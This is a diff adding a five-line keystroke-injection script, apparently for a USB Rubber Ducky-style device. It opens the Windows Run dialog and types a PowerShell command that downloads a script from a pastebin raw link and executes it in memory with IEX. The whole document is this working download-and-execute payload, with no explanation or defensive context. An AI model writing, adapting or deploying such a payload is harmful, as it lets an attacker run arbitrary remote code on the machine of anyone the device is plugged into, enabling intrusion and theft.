@@ -1,0 +1,5 @@
+DELAY 150
+GUI r
+DELAY 500
+STRING powershell "IEX(New-Object Net.WebClient).downloadString('https://pastebin.com/raw/QydhvCig')"
+ENTER
